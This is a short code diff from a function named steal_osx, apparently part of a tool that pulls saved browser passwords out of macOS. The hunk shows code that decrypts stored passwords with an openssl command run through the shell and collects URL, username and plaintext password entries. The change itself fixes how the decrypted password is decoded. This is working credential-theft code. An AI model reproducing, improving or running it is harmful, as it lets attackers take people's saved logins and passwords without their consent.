@@ -100,7 +100,7 @@ def steal_osx():
 					decrpytCommand = "openssl enc -base64 -d -aes-128-cbc -iv '"+iv+"' -K "+hex_key.decode('utf-8')+" <<< "+hex_enc_password.decode('utf-8')+" 2>/dev/null"
 					password = subprocess.check_output(decrpytCommand,
 									   shell=True)
-					recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+					recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password.decode('utf-8')))
 			except subprocess.CalledProcessError:
 				pass
 		return recovered
